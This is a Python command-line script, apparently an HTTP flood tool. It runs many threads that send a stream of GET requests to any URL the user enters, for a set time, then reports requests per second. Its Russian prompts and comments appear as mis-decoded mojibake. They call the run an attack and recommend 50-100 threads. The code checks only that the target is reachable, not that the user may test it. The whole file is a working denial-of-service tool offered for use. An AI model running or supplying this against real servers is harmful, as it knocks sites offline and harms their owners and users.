import requests
import threading
import time
import sys
from urllib.parse import urlparse
from colorama import init, Fore, Style

init(autoreset=True)

# --- –≠—Ñ—Ñ–µ–∫—Ç –ø–µ—á–∞—Ç–∏ ---
def print_line(text, color=Fore.WHITE, delay_char=0.01):
    for char in text:
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay_char)
    print(Style.RESET_ALL)

# --- –í–∞–ª–∏–¥–∞—Ü–∏—è URL ---
def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except Exception:
        return False

# --- –ê—Ç–∞–∫—É—é—â–∏–π –ø–æ—Ç–æ–∫ ---
def attack(target, duration, results):
    end_time = time.time() + duration
    sent = 0
    errors = 0
    while time.time() < end_time:
        try:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º GET-–∑–∞–ø—Ä–æ—Å
            requests.get(
                target,
                headers={'User-Agent': 'StressTester/1.0'},
                timeout=5
            )
            sent += 1
        except Exception:
            errors += 1
        time.sleep(0.007)  # –ú–∏–Ω–∏–º–∞–ª—å–Ω–∞—è –∑–∞–¥–µ—Ä–∂–∫–∞, —á—Ç–æ–±—ã –Ω–µ —É–ø–∞—Å—Ç—å —Å–∞–º–æ–º—É
    results.append((sent, errors))

# --- –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è ---
def main():
    target = input("–í–≤–µ–¥–∏—Ç–µ URL —Å–µ—Ä–≤–µ—Ä–∞: ").strip()
    if not is_valid_url(target):
        print_line("[!] –ù–µ–≤–µ—Ä–Ω—ã–π URL. –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ —É–∫–∞–∂–∏—Ç–µ http:// –∏–ª–∏ https://", Fore.RED)
        return

    try:
        threads_count = int(input("–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ –ø–æ—Ç–æ–∫–æ–≤ (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è 50-100): ") or "20")
        duration = int(input("–î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –∞—Ç–∞–∫–∏ –≤ —Å–µ–∫—É–Ω–¥–∞—Ö (—Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è 60-100): ") or "15")
    except ValueError:
        print_line("[!] –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–∞.", Fore.RED)
        return

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏
    print_line(f"[ ] –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ {target}...", Fore.CYAN)
    try:
        requests.get(target, timeout=5)
        print_line("[OK] –°–µ—Ä–≤–µ—Ä –¥–æ—Å—Ç—É–ø–µ–Ω. –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏...", Fore.GREEN)
    except Exception:
        print_line("[!] –°–µ—Ä–≤–µ—Ä –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω. –û—Ç–º–µ–Ω–∞.", Fore.RED)
        return

    print()
    print_line("üî• –ó–ê–ü–£–°–ö –∞—Ç–∞–∫–∏", Fore.LIGHTRED_EX)
    print_line(f"–¶–µ–ª—å: {target}", Fore.YELLOW)
    print_line(f"–ü–æ—Ç–æ–∫–æ–≤: {threads_count}", Fore.CYAN)
    print_line(f"–í—Ä–µ–º—è: {duration} —Å–µ–∫", Fore.MAGENTA)
    print_line("-" * 50, Fore.LIGHTBLACK_EX)

    # –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–æ–≤
    results = []
    threads = []
    start_time = time.time()

    for _ in range(threads_count):
        t = threading.Thread(target=attack, args=(target, duration, results))
        t.start()
        threads.append(t)

    # –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
    for t in threads:
        t.join()

    total_sent = sum(r[0] for r in results)
    total_errors = sum(r[1] for r in results)
    elapsed = time.time() - start_time
    rps = total_sent / elapsed if elapsed > 0 else 0

    # –í—ã–≤–æ–¥ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
    print()
    print_line("–†–ï–ó–£–õ–¨–¢–ê–¢–´ –ê–¢–ê–ö–ò", Fore.LIGHTGREEN_EX)
    print_line("=" * 50, Fore.LIGHTBLUE_EX)
    print_line(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –∑–∞–ø—Ä–æ—Å–æ–≤: {total_sent}", Fore.WHITE)
    print_line(f"–û—à–∏–±–æ–∫: {total_errors}", Fore.LIGHTRED_EX)
    print_line(f"–í—Ä–µ–º—è: {elapsed:.2f} —Å–µ–∫", Fore.CYAN)
    print_line(f"–°–∫–æ—Ä–æ—Å—Ç—å: {rps:.1f} RPS (–∑–∞–ø—Ä–æ—Å–æ–≤/—Å–µ–∫)", Fore.YELLOW)
    print_line("=" * 50, Fore.LIGHTBLUE_EX)
    print_line("‚úÖ –ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞", Fore.LIGHTGREEN_EX)

# --- –ó–∞–ø—É—Å–∫ ---
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print_line("\n[!] –ê—Ç–∞–∫–∞ –ø—Ä–µ—Ä–≤–∞–Ω–∞.", Fore.RED)
    except Exception as e:
        print_line(f"[ERROR] {str(e)}", Fore.RED)